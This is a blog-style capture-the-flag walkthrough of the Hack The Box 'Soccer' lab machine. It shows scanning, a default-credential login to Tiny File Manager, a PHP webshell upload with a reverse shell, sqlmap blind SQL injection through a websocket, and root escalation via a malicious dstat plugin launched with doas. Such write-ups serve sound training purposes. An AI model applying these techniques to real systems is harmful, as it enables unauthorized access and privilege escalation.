---
title: "HTB - Soccer Walkthrough"
date: 2023-06-11
author: Luigi Vezzoso
layout: post
tags: 
    - walkthrough
    - hackthebox
    - pentest
category: posts
---

Hi There!

This is my first walkthrough post ever. I decided to write this series of posts about exploitation of machines available on CTF or other platform like [Hack The Box](https://app.hackthebox.com/). This time the taget was **SOCCER** machine. 

My goal is to describe the methodology and track the general process used to reach the goal: obtain a root shell on the machines.


![soccer-img](assets/postimages/soccer/Soccer.png)

## initial footprint
Initial footprint is the phase where we try to get as much information as possible using a multiple methods: from google search (or osint in general), DNS query, etc.

On HTB machine this process is not required because we already have a target well defines in terms of IP target and we can start to enumerate services directly.

Usually hacking HTB boxes require a black-box methodology: no information is provided by the platform except the name of the machine... which sometime it gives some hints about the the journey to **root**.

The scope of initial footprint is to have an idea of which services are exposed by a machine to figure out its entry points, the attack surface, and in general how we can interact with that.

I like to perform three types of service scan:

- quick scan over the most common TCP ports
- full TCP scan
- UDP scan

### quick Scan

To obtain quickly some information, usually I start with basic port scan. Bby default namp will scan the top 1000 most common ports.

**nmap -sV 10.10.11.194 -oG soccer.quick.nmap**

After the initial scan I proceed with full scan and udp scan:

**nmap -sV 10.10.11.194 -p- -oS soccer.full.nmap**

{% highlight shell %}

xabaras@helix:~/workdir/ctf/htb/soccer.htb$ nmap -sV 10.10.11.194 -oG soccer.quick.nmap 

Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-09 23:01 CET
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.071s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port9091-TCP:V=7.80%I=7%D=1/9%Time=63BC8EA4%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Mon,\x2009\x20Jan\x202023\x2022:01:13\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Mon,\x2009\x20Jan\x202023\x2022:01:14\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<met
SF:a\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Ca
SF:nnot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Mon,\x
SF:2009\x20Jan\x202023\x2022:01:14\x20GMT\r\nConnection:\x20close\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut
SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x
SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds

xabaras@helix:~/workdir/ctf/htb/soccer.htb$ 

{% endhighlight %}

Initial quick scan alreay provided all the infomation in very few second (20sec!!!). Full scan didn't give much more information as the machine just have ports 22, 80, 9091 opened... so I just omitted the results of full scan. 

## service enumeration
Looking at the service exposed by the machine, two services capture our attention: port 80 and 9091. 

### 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
We leave port 22 as last chance as usually it doesn't provide possibility to attack the box in a simple way due:
- encrypted traffic 
- auth required - brute force is time consuming
- very common and tested service - so not common exploit

### 80/tcp open http nginx 1.18.0 (Ubuntu) 
HTTP service with related website/webapplication usually is more likely to expose wider attack surface so it's a good target to focus on during a pentest. When we try to access a HTTP/HTTPS server we should take in consideration, the possibility of having multiple VHOST on the same server. 

On HTB platform, every machine have a FQDNs like the **box name** in **htb** domain: in this case we have **soccer.htb**. Be careful... this is just a rule of thumb and more FQDN migth be assigned to same machine. Additional discovery/enumeration provess is suggested like:
- check *subject alternative names* (SAN) in the certificate (if the service is in TLS)
- check *hosts file* in the server as soon we have access on it
- check the reverse proxy and/or webserver/application-server *VHOST* configuration

After having added the box FQDN into pentest machine *hosts file*, we can start the HTTP service enumeration. 

The first and basic way is to use a standard browser to check in easy way if we can access the website, if we can recognize of-the-shelf product, etc.

Using our preferred browser we can see the soccer webpage....but doesn't see to have any real features other than some static code.

![soccer-web](assets/postimages/soccer/soccer-webpage-01.png)

Probably the basic page could be a sort of *rabbit-hole* just to waste our time on that. I decided to perfom a website enumeration to detect other hidden pages (not linked direcly to the homepage).

To perform webpage enumeration we could use several tool (dirb, burp, etc.) or custom scripts. At the moment, my preferred tool is [Gobuster](https://github.com/OJ/gobuster) for its very good performances, good visualization capabilities.

{% highlight shell %}

xabaras@helix:~/workdir/ctf/htb/soccer.htb$ gobuster -u soccer.htb -w /home/xabaras/hacking-tool/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://soccer.htb/
[+] Threads      : 10
[+] Wordlist     : /home/xabaras/hacking-tool/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/01/10 00:09:28 Starting gobuster
=====================================================
/tiny (Status: 301)
Progress: 49676 / 220561 (22.52%)

{% endhighlight %}

Our fuzzer found additiona page called **/tiny** who respond with [HTTP 301 message](https://en.wikipedia.org/wiki/HTTP_301) which indicate a redirect to different page (i.e. to an authentication page). 

Checking again with our browser we will be in front to **Tiny File Manager** login page!

![soccer-tiny-file-manager](assets/postimages/soccer/soccer-tiny-file-manager.png)

Facing a login page, we should try to identify a way to access or bypass the login process and this would require multiple tests to identify how the login process works, if some security measures are in place like anti-brute force, MFA, etc. I.e some possible tests could be:

- check default credentiala
- bruteforce
- looking/searching for authentication bug/vulnerability
- steal some credential (in real scenario)


Searching on Internet some info about [tiny file manager](https://tinyfilemanager.github.io/), we could find its opensource project, hosted in GitHub. Let's try to see if default credential exists on documentation: searching in Tiny File Manager documentaion we can easely find this information.

![tiny-docs](assets/postimages/soccer/tiny-fm-docs.png)

*admin/admin@123*
*user/12345*

Using default credentials we were able to access the filemanager. 

![tiny-accessed](assets/postimages/soccer/tiny-accessed.png)


Tiny File Manager is a web application which provide basic file management capability to our server using a browser. Having access to the web application we can user used to download and upload files on the webserver. 

We can try to upload some webshell and check if there are any restriction on file type and if we can execute the webshell code.

I simly tryed to upload a basic **php** webshell and I used the browser to open it...

![webshell-upload](assets/postimages/soccer/reverse_shell.png)

After opening **xabaras.php** the php code is executed and shell is opened in the attacker machine.


{% highlight shell %}

xabaras@helix:~/workdir/ctf/htb/soccer.htb$ nc -nvlp 8000
Listening on 0.0.0.0 8000

Connection received on 10.10.11.194 46782
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 22:38:28 up  2:09,  2 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ $ 

{% endhighlight %}

We obtained a shell on the system, but with low privileges (www-data). Now it's time to enumerate more to do a privilege escalation. We can now enumerate more: looking for additional services listening on the machine, additional **vhosts**, additional users, etc.

Let's try to see if other websites are hosted on same box.

{% highlight shell %}

$ cat /etc/hosts
127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb

127.0.1.1	ubuntu-focal	ubuntu-focal

$ 

{% endhighlight %}

There is additional website *soc-player.soccer.htb*. 

![soc-player-web](assets/postimages/soccer/soc-player.png)

A login page is displayed and there is a registration and login form. In this case seems possible to register for an account and login the the website.

![soc-player-register](assets/postimages/soccer/registering.png)

After login to the application, a page with a form used to check ticket number. In case we insert the correct number it's ok if not an error message is displayed... Very strange and CTF style application :)

![wrong-ticket](assets/postimages/soccer/wrongticket.png)

Using browser developer tools I tryed to figure out which type of mechanism is behind the form... reading the javascript code I saw a websocket request!!! That the little hint of the box name SOCcer... I suppose analyzing the websocket should be the correct way to solve the machine. 

![web-socket](assets/postimages/soccer/websocket.png)

I started to learn more on WS: how to enumerate more, on type of attacks, etc. Considering that ticket-id could be placed on an internal database I tryed to use **sqlmap** which have some parameters to test WS services. The WS seems to be SQL-injectable and I was able to dump all the DB and tables.

{% highlight shell %}
xabaras@helix:~/workdir/ctf/htb/soccer.htb$ sqlmap -u ws://soc-player.soccer.htb:9091/ --data '{"id":"64286*"}'
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:50:47 /2023-02-17/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] y
[23:50:54] [INFO] resuming back-end DBMS 'mysql' 
[23:50:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"72525 AND (SELECT 7135 FROM (SELECT(SLEEP(5)))nZtU)-- nwsQ"}
---
[23:50:57] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[23:50:57] [INFO] fetched data logged to text files under '/home/xabaras/.sqlmap/output/soc-player.soccer.htb'
[23:50:57] [WARNING] your sqlmap version is outdated

[*] ending @ 23:50:57 /2023-02-17/

{% endhighlight %}

Looking on the results I can find my new user&password and also other entries! 

{% highlight shell %}
xabaras@helix:~$ cat /home/xabaras/.sqlmap/output/soc-player.soccer.htb/dump/soccer_db/accounts.csv.7
password
PlayerOftheMatch2022
xabaras
{% endhighlight %}

When we found password we can try simple password-reuse technics to see if the same password is used for multiple users/services, etc.


{% highlight shell %}

xabaras@helix:~/workdir/ctf/htb/soccer.htb$ ssh player@soccer.htb
player@soccer.htb's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb 17 22:54:28 UTC 2023

  System load:           0.0
  Usage of /:            71.1% of 3.84GB
  Memory usage:          27%
  Swap usage:            0%
  Processes:             235
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.194
  IPv6 address for eth0: dead:beef::250:56ff:feb9:eee3


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb 17 21:52:56 2023 from 10.10.14.174
player@soccer:~$ 

{% endhighlight %}

:) Additional and more powerful shell obtained with a the user-flag! 

{% highlight shell %}

player@soccer:~$ id
uid=1001(player) gid=1001(player) groups=1001(player)
player@soccer:~$ cat /home/player/
.bash_history     .bashrc           .gnupg/           .profile          dstat_socccer.py  snap/             
.bash_logout      .cache/           .local/           .viminfo          dstat_soccer.py   user.txt          
player@soccer:~$ cat /home/player/user.txt 
a53fee5310e0XXXXXXX
player@soccer:~$ 

{% endhighlight %}

To complete the box we should escalate our privileges to **root** - let's try to find **setuid** executables to see which command expose enougth attack surface.


{% highlight shell %}
player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
player@soccer:~$ 
{% endhighlight %}

A specific program has attracted my attention: DOAS. It's not as common as sudo. So I decided to check its configuration.

{% highlight shell %}
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
{% endhighlight %}

Se I can run */usr/bin/dstat* with **root** privileges without the need to use password. Loocking on the Net I found a DSTAT priv-escalation exploit. 

![https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/)

The exploit is very simple: DSTAT use external python modules to perform additional data/stats computation - we just need to create an evil module, place it in correct folder and run the DSTAT command like root using DOAS.

{% highlight shell %}

player@soccer:~$ cat /usr/local/share/dstat/xabaras.py


import os
os.setuid(0)
os.system("/bin/bash")
{% endhighlight %}

Let's run the exploit:

{% highlight shell %}

player@soccer:~$ /usr/local/bin/doas -u root /usr/bin/dstat --xabaras
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp

root@soccer:/home/player# id
uid=0(root) gid=0(root) groups=0(root)
root@soccer:/home/player# cat /root/root.txt 
b35fe80d70d15e0f4334b1ddb8d7060e
root@soccer:/home/player# 

{% endhighlight %}


## conclusion
This machine is an easy machine but it would require some additional information on WebSocket enumeration. The exploit porcess was straightforward with every steps clear and not rabbit-hole. 






